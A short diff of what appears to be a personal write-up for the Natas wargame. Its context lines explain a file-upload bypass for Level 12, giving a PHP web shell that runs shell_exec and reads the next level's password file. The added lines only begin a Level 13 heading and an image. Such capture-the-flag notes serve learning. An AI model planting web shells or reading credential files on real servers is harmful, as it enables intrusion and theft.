@@ -95,4 +95,7 @@ Solution in this problem is use another method of injection
  `<?php echo shell_exec("ls");?>` but dont send it yet you need change in inspector type from jpg to php
  and than upload file it should execute. 
  So ones it worked you should change you script to `<?php echo shell_exec("cat /etc/natas_webpass/natas13");?>` 
+ # Level13
  
+![image](https://github.com/user-attachments/assets/6f9dc512-7bff-4562-ac73-eefd76a7ee9c)
+
